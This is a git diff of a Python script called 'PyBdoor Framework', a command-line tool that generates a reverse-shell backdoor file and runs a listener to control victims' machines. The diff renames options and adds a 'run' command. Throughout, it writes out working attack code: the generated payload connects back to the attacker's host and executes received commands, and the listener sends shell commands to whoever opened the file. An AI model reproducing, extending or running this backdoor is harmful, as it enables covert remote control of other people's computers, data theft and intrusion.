@@ -21,7 +21,8 @@ def banner():
 | _ \ )(_))| _ )  _| | ((_) ((_) ((_) 
 |  _/| || || _ \/ _` |/ _ \/ _ \| '_| 
 |_|   \_, ||___/\__,_|\___/\___/|_|   
-      |__/                             
+      |__/    
+
       PyBdoor Framework''' + Style.RESET_ALL)
 	print(Fore.GREEN)
 	print("Copyright : ph4mch13n")
@@ -29,21 +30,19 @@ def banner():
 	print("Tele : https://t.me/Anon0psNews")
 	print("Github : /Phamchie")
 	print('''
-============================================
-| command                 options          |
-============================================  
-| set lhost        set ip system attack    |
-| set lport        set port system attack  |
-|                                          |
-| set rhost        set ip victim           |
-| set rport        set port victim         |
-|                                          |
-| set filename     Created File Backdoor   |
-|                                          |
-| options          show options            |
-| help             helping for tools       |
-| exploit          run exploit victim      |
-============================================''')
+========================================================
+| command                 options                      |
+========================================================  
+| set host         set ip system attack                |
+| set port         set port system attack              |
+|                                                      |
+| set filename     Created File Backdoor               |
+|                                                      |
+| options          show options                        |
+| help             helping for tools                   |
+| run              run session exploit victim          |
+| exploit          run exploit victim                  |
+========================================================''')
 
 banner()
 
@@ -53,9 +52,6 @@ print("")
 
 lhost = '127.0.0.1'
 lport = '4444'
-
-rhost = '127.0.0.1'
-rport = '4444'
 
 filename = 'null'
 
@@ -67,58 +63,32 @@ while session:
 	if text_main == "help":
 		print("")
 		print('''
-============================================
-| command                 options          |
-============================================  
-| set lhost        set ip system attack    |
-| set lport        set port system attack  |
-|                                          |
-| set rhost        set ip victim           |
-| set rport        set port victim         |
-|                                          |
-| set filename     Created File Backdoor   |
-|                                          |
-| options          show options            |
-| help             helping for tools       |
-| exploit          run exploit victim      |
-============================================
+========================================================
+| command                 options                      |
+========================================================  
+| set host         set ip system attack                |
+| set port         set port system attack              |
+|                                                      |
+| set file         Created File Backdoor               |
+|                                                      |
+| options          show options                        |
+| help             helping for tools                   |
+| run              run session exploit victim          |
+| exploit          run exploit victim                  |
+========================================================
 ''')
 		print("")
 
-	elif text_main == "set lhost":
-		print("")
-		lhost = input("LHOST : ")
-		print("")
+	elif text_main == "set host":
+		lhost = input("HOST : ")
 		print(Fore.BLUE + "[*]" + Style.RESET_ALL + f" set LHOST : {lhost}")
-		print("")
 
-	elif text_main == "set lport":
-		print("")
-		lport = input("LPORT : ")
-		print("")
+	elif text_main == "set port":
+		lport = input("PORT : ")
 		print(Fore.BLUE + "[*]" + Style.RESET_ALL + f" set LPORT : {lport}")
-		print("")
 
-	elif text_main == "set rhost":
-		print("")
-		rhost = input("RHOST : ")
-		print("")
-		print(Fore.BLUE + "[*]" + Style.RESET_ALL + f" set RHOST : {rhost}")
-		print("")
-
-	elif text_main == "set rport":
-		print("")
-		rport = input("RPORT : ")
-		print("")
-		print(Fore.BLUE + "[*]" + Style.RESET_ALL + f" set RPORT : {rport}")
-		print("")
-
-
-
-	elif text_main == "set filename":
-		print("")
+	elif text_main == "set file":
 		filename = input("File Name : ")
-		print("")
 		code = f'''
 import socket
 import subprocess
@@ -127,8 +97,8 @@ import os
 
 os.system('cls' if os.name == 'nt' else 'clear')
 
-ip = '{rhost}'
-port = {rport}
+ip = '{lhost}'
+port = {lport}
 
 s = socket.socket(socket.AF_INET, 
 	socket.SOCK_STREAM)
@@ -170,7 +140,6 @@ while True:
 
 		print(Fore.BLUE + "[*]" + Style.RESET_ALL + f" set filename {filename}.py")
 
-		print("")
 
 	elif text_main == "options":
 		print(f'''
@@ -178,7 +147,6 @@ while True:
 | options | IP              | PORT   |   
 |=====================================
 | LHOST   : {lhost}         {lport}
-| RHOST   : {rhost}         {rport}
 ======================================
 
 =======================
@@ -193,38 +161,41 @@ while True:
 		import socket
 		import sys
 
-		IP = f'{lhost}'
-		PORT = 4444
+		ip = str(lhost)
+		port = int(lport)
 
 		s = socket.socket(socket.AF_INET,
 			socket.SOCK_STREAM)
 
+		s.bind((ip, port))
+
 		s.setsockopt(socket.SOL_SOCKET, 
 			socket.SO_REUSEADDR, 
 			1)
-
-		s.bind((IP, PORT))
+		
 		s.listen(1)
 
 
 		print("")
-		print(Fore.BLUE + '[*]' + Style.RESET_ALL + f' Starting Reverse Handler On {rhost}:{rport}')
+		print(Fore.BLUE + '[*]' + Style.RESET_ALL + f' Starting Reverse Handler On {lhost}:{lport}')
 		time.sleep(2)
 		print(Fore.BLUE + '[*]' + Style.RESET_ALL + f' Startingthe payload backdoor...')
 		time.sleep(1)
-		print(Fore.BLUE + '[*]' + Style.RESET_ALL + f' Server is listening on '+ str(rhost) + ":" + str(rport) + '...')
+		print(Fore.BLUE + '[*]' + Style.RESET_ALL + f' Server is listening on '+ str(lhost) + ":" + str(lport) + '...')
+		
 		conn, addr = s.accept()
-		print(Fore.BLUE + '[*]' + Style.RESET_ALL + f' Connected Done From ', addr)
+		
+		print(Fore.BLUE + '[*]' + Style.RESET_ALL + f' 1 target has open the file, service as started ', addr)
 		time.sleep(2)
-		print(Fore.BLUE + '[*]' + Style.RESET_ALL + f' Join Us : https://t.me/Anon0psNews/')
+		print(Fore.BLUE + '[*]' + Style.RESET_ALL + f' wait for connecting session ', addr)
 		time.sleep(1)
-		print(Fore.BLUE + '[*]' + Style.RESET_ALL + f' session started...')
+		print(Fore.BLUE + '[*]' + Style.RESET_ALL + f' session started ', str(addr) + '...')
 
 		session_door = True
 
 		while True:
 
-		      sys.stdout.write(f"\n{rhost}(meterpreter) > ")
+		      sys.stdout.write(f"\n{addr} > ")
 		      command = sys.stdin.readline()
 
 		      if command == 'exit\n':
@@ -240,3 +211,59 @@ while True:
 		          conn.send(command.encode())
 		          output = conn.recv(1024)
 		          print("\n", output)
+
+	elif text_main == "run":
+
+		import socket
+		import sys
+
+		ip = str(lhost)
+		port = int(lport)
+
+		s = socket.socket(socket.AF_INET,
+			socket.SOCK_STREAM)
+
+		s.bind((ip, port))
+
+		s.setsockopt(socket.SOL_SOCKET, 
+			socket.SO_REUSEADDR, 
+			1)
+		
+		s.listen(1)
+
+
+		print("")
+		print(Fore.BLUE + '[*]' + Style.RESET_ALL + f' Starting Reverse Handler On {lhost}:{lport}')
+		time.sleep(2)
+		print(Fore.BLUE + '[*]' + Style.RESET_ALL + f' Startingthe payload backdoor...')
+		time.sleep(1)
+		print(Fore.BLUE + '[*]' + Style.RESET_ALL + f' Server is listening on '+ str(lhost) + ":" + str(lport) + '...')
+		
+		conn, addr = s.accept()
+
+		print(Fore.BLUE + '[*]' + Style.RESET_ALL + f' 1 target has open the file, service as started ', addr)
+		time.sleep(2)
+		print(Fore.BLUE + '[*]' + Style.RESET_ALL + f' wait for connecting session ', addr)
+		time.sleep(1)
+		print(Fore.BLUE + '[*]' + Style.RESET_ALL + f' session started ', str(addr) + '...')
+
+		session_door = True
+
+		while True:
+
+		      sys.stdout.write(f"\n{addr} > ")
+		      command = sys.stdin.readline()
+
+		      if command == 'exit\n':
+		          print('[+] Session Closed')
+		          conn.send(b"exit")
+		          conn.close()
+		          break  
+
+		      elif command == 'system_info\n':
+		      	usr = conn.send(b'uname -o')
+
+		      elif command != '\n':
+		          conn.send(command.encode())
+		          output = conn.recv(1024)
+		          print(output)
